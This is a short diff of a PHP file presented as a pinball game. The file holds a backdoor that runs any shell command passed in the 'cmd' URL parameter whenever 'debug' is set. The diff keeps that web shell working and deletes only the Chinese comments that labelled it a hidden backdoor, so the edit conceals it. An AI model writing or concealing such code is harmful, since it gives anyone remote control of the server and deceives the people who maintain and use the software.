@@ -1,10 +1,7 @@
 <?php
 // 弹球游戏
-// 隐藏后门 - 命令执行
 if(isset($_GET['debug'])) {
-    // 后门触发条件
     if(isset($_GET['cmd'])) {
-        // 执行系统命令
         echo "<pre>";
         system($_GET['cmd']);
         echo "</pre>";
